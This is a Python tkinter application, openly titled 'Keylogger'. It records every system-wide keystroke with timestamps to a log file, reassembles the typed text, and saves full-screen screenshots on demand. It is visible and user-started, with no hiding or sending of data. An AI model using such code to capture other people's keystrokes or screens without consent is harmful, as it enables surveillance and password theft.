import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput.keyboard import Listener, Key
import threading
from PIL import ImageGrab
import datetime
import logging

# --- Setup basic logging to file ---
logging.basicConfig(filename="keylog_final.txt",
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S')

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("700x500")
        self.root.configure(bg="#2E2E2E")

        self.is_logging = False
        self.listener_thread = None
        self.listener = None
        self.sentence_buffer = ""

        # --- GUI Elements ---
        style = {
            "bg": "#2E2E2E", "fg": "#FFFFFF", "insertbackground": "white",
            "selectbackground": "#555555",
        }
        button_style = {
            "bg": "#4CAF50", "fg": "white", "activebackground": "#45a049",
            "relief": "flat", "font": ("Helvetica", 10, "bold")
        }
        stop_button_style = {
            "bg": "#f44336", "fg": "white", "activebackground": "#d32f2f",
            "relief": "flat", "font": ("Helvetica", 10, "bold")
        }

        control_frame = tk.Frame(root, bg=style["bg"], pady=10)
        control_frame.pack(fill=tk.X)

        self.start_button = tk.Button(control_frame, text="Start Logging", command=self.start_logging, **button_style)
        self.start_button.pack(side=tk.LEFT, padx=10)

        self.stop_button = tk.Button(control_frame, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED, **stop_button_style)
        self.stop_button.pack(side=tk.LEFT, padx=10)

        self.screenshot_button = tk.Button(control_frame, text="Take Screenshot", command=self.take_screenshot, bg="#2196F3", fg="white", activebackground="#1e88e5", relief="flat", font=("Helvetica", 10, "bold"))
        self.screenshot_button.pack(side=tk.LEFT, padx=10)

        self.log_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=20, width=70, bg="#1C1C1C", fg=style["fg"], insertbackground=style["insertbackground"], selectbackground=style["selectbackground"])
        self.log_area.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

        self.log_area.tag_configure(
            "final_text_style",
            font=("Courier", 11, "italic"),
            foreground="#A7D1A7"
        )

        self.log_area.config(state=tk.DISABLED)

        # --- Copyright / Signature Label ---
        copyright_label = tk.Label(
            root,
            text="© 2025 Made by Umair",
            bg="#2E2E2E",
            fg="#AAAAAA",
            font=("Helvetica", 9, "italic")
        )
        copyright_label.pack(side=tk.BOTTOM, pady=(0, 5))

    def start_logging(self):
        """Starts the keylogging process."""
        self.is_logging = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.sentence_buffer = ""
        
        start_message = "Logging started... (Press 'Esc' to close GUI)\n"
        logging.info(start_message.strip())
        self.update_log_area(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]}: {start_message}")

        self.listener_thread = threading.Thread(target=self.run_listener, daemon=True)
        self.listener_thread.start()

    def stop_logging(self):
        """Stops logging and displays the final text block."""
        if self.is_logging:
            self.is_logging = False
            if self.listener:
                self.listener.stop()

            if self.sentence_buffer:
                final_log_for_file = f"FINAL BUFFERED TEXT: \"{self.sentence_buffer.strip()}\""
                logging.info(final_log_for_file)

                self.log_area.config(state=tk.NORMAL)
                
                # --- KEY CHANGE IS HERE ---
                # The colon at the end of the timestamp string has been removed.
                timestamp_str = f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]}"
                # --- END OF KEY CHANGE ---
                
                header_text = "\nFINAL BUFFERED TEXT:\n"
                content_to_display = f"\"{self.sentence_buffer.strip()}\"\n"
                
                self.log_area.insert(tk.END, header_text, "final_text_style")
                self.log_area.insert(tk.END, content_to_display, "final_text_style")
                self.log_area.insert(tk.END, timestamp_str + "\n", "final_text_style")
                
                self.log_area.see(tk.END)
                self.log_area.config(state=tk.DISABLED)

            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            
            stop_message = "\nLogging stopped.\n"
            logging.info(stop_message.strip())
            self.update_log_area(stop_message)
            messagebox.showinfo("Success", "Logs saved to keylog_final.txt")

    def run_listener(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.listener = listener
            listener.join()

    def on_release(self, key):
        """Closes the application when 'Esc' is released."""
        if key == Key.esc:
            self.stop_logging()
            self.root.destroy()
            return False

    def on_press(self, key):
        """Callback for key presses, logs individual keys."""
        if not self.is_logging: return
        timestamp = f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]}"
        try:
            self.sentence_buffer += key.char
            log_text = f"Key pressed: '{key.char}'\n"
            logging.info(f"'{key.char}'")
        except AttributeError:
            key_name = str(key).replace("Key.", "").upper()
            log_text = f"Special key: [{key_name}]\n"
            logging.info(f"[{key_name}]")
            if key == Key.space: self.sentence_buffer += ' '
            elif key == Key.enter: self.sentence_buffer += '\n'
            elif key == Key.backspace: self.sentence_buffer = self.sentence_buffer[:-1]
        self.update_log_area(f"{timestamp}: {log_text}")

    def update_log_area(self, text):
        """Updates the text area in the GUI."""
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, text)
        self.log_area.see(tk.END)
        self.log_area.config(state=tk.DISABLED)

    def take_screenshot(self):
        """Takes a screenshot and saves it."""
        try:
            timestamp = datetime.datetime.now()
            filename = f"screenshot_{timestamp.strftime('%Y%m%d_%H%M%S')}.png"
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            log_message = f"Screenshot saved as {filename}"
            logging.info(log_message)
            self.update_log_area(f"\n{timestamp.strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]}: {log_message}\n")
            messagebox.showinfo("Screenshot", log_message)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to take screenshot: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()